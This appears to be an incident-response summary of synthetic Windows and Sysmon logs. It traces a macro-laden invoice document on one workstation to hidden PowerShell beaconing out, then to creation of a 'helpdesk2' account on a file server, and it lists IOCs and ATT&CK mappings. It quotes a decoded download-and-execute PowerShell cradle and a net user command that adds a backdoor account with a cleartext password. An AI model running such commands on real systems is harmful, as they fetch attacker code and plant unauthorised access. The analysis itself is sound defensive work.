---
source: Windows Security + Sysmon logs (logs/windows/)
analyst: endpoint-analyst
date_analyzed: 2026-07-24
files_reviewed:
  - logs/windows/sysmon-2026-07-09.xml
  - logs/windows/sysmon-2026-07-10.xml
  - logs/windows/sysmon-2026-07-11.xml
  - logs/windows/security-2026-07-09.xml
  - logs/windows/security-2026-07-10.xml
  - logs/windows/security-2026-07-11.xml
---

# Endpoint Log Analyst — Incident Summary

**Scope analyzed:** 305 total events across 6 files (149x 4624, 17x 4625, 1x 4688, 1x 4720, 136x Sysmon EventID 1, 1x Sysmon EventID 3), covering hosts DC1, FS01, and workstations WKSTN-005/017/042/064/088/099, ~20 users, 2026-07-09 through 2026-07-11.

The malicious signal is a single, tightly-clustered chain on **2026-07-10**, centered on user **mrodriguez** / host **WKSTN-017** (10.10.17.55), with a follow-on action on **FS01**. Everything else in the dataset (repeated `whoami.exe`, `Get-Process` calls, Chrome/Outlook/Teams launches, scattered single-attempt 4625s, and widespread `services.exe`-mediated network logons across ~20 users) forms a consistent daily baseline and was checked but ruled out as noise.

## Timeline (UTC)

| Time | Host | Event | Detail |
|---|---|---|---|
| 2026-07-10 09:06:57 | WKSTN-017 | Sysmon 1 | Chrome launched by mrodriguez (likely download vector for the lure doc) |
| 2026-07-10 09:07:52 | WKSTN-017 | Sysmon 1 (tagged `T1059.001`) | `WINWORD.EXE "C:\Users\mrodriguez\Downloads\Invoice_7742.docm"` spawns hidden, base64-encoded PowerShell |
| 2026-07-10 09:08:05 | WKSTN-017 | Sysmon 3 | Same PowerShell process (PID 8835/6712, shared ProcessGuid) connects outbound to **185.220.101.47:443** |
| 2026-07-10 16:04:51 | FS01 | Security 4624 | mrodriguez network logon (Type 3, NTLM, `services.exe`) from 10.10.17.55 |
| 2026-07-10 16:06:14 | FS01 | Security 4688 | `cmd.exe -> net.exe user helpdesk2 P@ssw0rd2026! /add` (SubjectUser=mrodriguez) |
| 2026-07-10 16:06:55 | FS01 | Security 4720 | Account `helpdesk2` created, SamAccountName=helpdesk2, domain CORP |
| 2026-07-11 18:17:09 | WKSTN-017 | Sysmon 1 | `cmd.exe -> whoami.exe` under mrodriguez (matches an org-wide daily baseline pattern — low-signal on its own) |

No logon events for `helpdesk2` appear anywhere before the dataset ends (2026-07-11 19:53), so the backdoor account was not observed being used within this window.

**Decoded PowerShell payload:**
```
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')
```
Note: the decoded URL specifies port 80, but the actual Sysmon connection was to port 443 — a minor inconsistency worth confirming against proxy/firewall logs.

## IOCs

- **External IP:** `185.220.101.47` (falls in the 185.220.101.0/24 block, a well-known Tor exit-node range)
- **URL:** `http://185.220.101.47/update.ps1`
- **File:** `C:\Users\mrodriguez\Downloads\Invoice_7742.docm`
- **Malicious PowerShell hashes:** MD5 `91A2B3C4D5E6F708192A3B4C5D6E7F80`, SHA256 `1A2B3C4D5E6F708192A3B4C5D6E7F8091A2B3C4D5E6F708192A3B4C5D6E7F80` (note: sequential/placeholder-looking hex, treat as synthetic)
- **Account created:** `helpdesk2` / password `P@ssw0rd2026!` (exposed in cleartext via process command line)
- **User/host:** `CORP\mrodriguez`, SID `S-1-5-21-1004336348-1177238915-682003330-1200`; source workstation WKSTN-017.corp.local (10.10.17.55)
- **Target host:** FS01.corp.local

## ATT&CK Techniques

| Technique | Evidence | Confidence |
|---|---|---|
| T1566 Phishing (lure doc) | `Invoice_7742.docm` opened from Downloads, Chrome launched ~1 min prior | Medium (no email/download-source log to confirm delivery channel) |
| T1204.002 User Execution: Malicious File | WINWORD.EXE opens .docm, immediately spawns PowerShell | High |
| T1059.001 PowerShell | Sysmon rule explicitly tags `technique_id=T1059.001` | High |
| T1027 Obfuscated Files/Info | `-W Hidden -Enc <base64>` | High |
| T1105 Ingress Tool Transfer | `DownloadString('http://185.220.101.47/update.ps1')` | High |
| T1071.001 Web Protocols (C2) | Outbound to 185.220.101.47:443 from powershell.exe | High |
| T1090.003 Multi-hop Proxy (possible Tor) | Destination IP in known Tor exit range | Low-Medium (inferred from IP range only, not confirmed) |
| T1078 Valid Accounts | Subsequent FS01 action ran under mrodriguez's existing session/logon channel rather than a new exploit | Medium |
| T1021 Remote Services (lateral movement) | `services.exe`-mediated network logon to FS01 | Low — this exact logon pattern (Type 3, `services.exe`) is a baseline behavior for ~20 users org-wide, not unique to this incident; the logon itself is not distinguishing |
| T1136.001/.002 Create Account | `net.exe user helpdesk2 ... /add` -> 4720 confirms creation | High (event); Medium (local vs. domain scope — see Questions) |
| T1033/T1087 Discovery | `whoami.exe` on WKSTN-017 by mrodriguez | Low — indistinguishable from the daily `whoami`/`Get-Process` pattern seen for nearly every user in the dataset |

No Sysmon EventID 13 (registry), scheduled-task, or service-installation events exist anywhere in the dataset, and no 4672 (privilege escalation) events exist at all — persistence and privilege-escalation visibility is limited to what's captured above. No brute-force pattern was found in the 17 total 4625s (single scattered bad-password attempts spread across many users/hosts/days, not rapid repeated attempts). No out-of-place browser command-line flags were found anywhere — all Chrome launches are plain `"chrome.exe"` with no arguments.

## Questions / Gaps for other sources

1. **Sysmon coverage gap:** Sysmon is only present on the 6 workstations, not on FS01 or DC1 — the FS01 account-creation is visible only via Security 4688/4720; there is no process tree, no follow-on child processes, and no way to see what else ran on FS01 that session.
2. **helpdesk2 account scope:** The 4720 fired on FS01 (not DC1), but the target SID shares the domain's SID prefix — confirm via AD audit logs on DC1 whether this is a genuine domain account (and check group memberships / whether it was added to any privileged group) or a local FS01 account misattributed in this synthetic log.
3. **Initial access vector:** No email or web-proxy logs to confirm how `Invoice_7742.docm` arrived (email attachment vs. web download) — check mail gateway / Azure AD sign-in logs and any EDR download telemetry.
4. **Credential exposure:** Was mrodriguez's session hijacked (token theft/RDP session riding) to perform the FS01 action, or did the C2 channel deliver a second-stage tool that used cached/harvested credentials? Check for any Kerberos ticket anomalies or unusual process ancestry on WKSTN-017 between 09:08 and 16:04 (a ~7-hour gap with no additional endpoint signal in this dataset).
5. **helpdesk2 usage:** No logons for `helpdesk2` appear before the dataset ends — check subsequent days' logs (beyond 07-11 19:53) and Azure AD sign-in logs for first use of this account, especially from external IPs.
6. **Port mismatch:** Payload URL uses `http://` (port 80) but the observed connection was to port 443 — confirm with proxy/firewall logs whether traffic was upgraded to TLS or logged with a different port than requested.
7. **Scope of mrodriguez's admin reach:** mrodriguez shows baseline `services.exe` logons to WKSTN-064, WKSTN-005, WKSTN-042, and WKSTN-088 both before and after the compromise — confirm this is a known/authorized IT-helpdesk admin pattern for this account (would explain why they had rights to create a domain account) rather than additional attacker lateral movement.
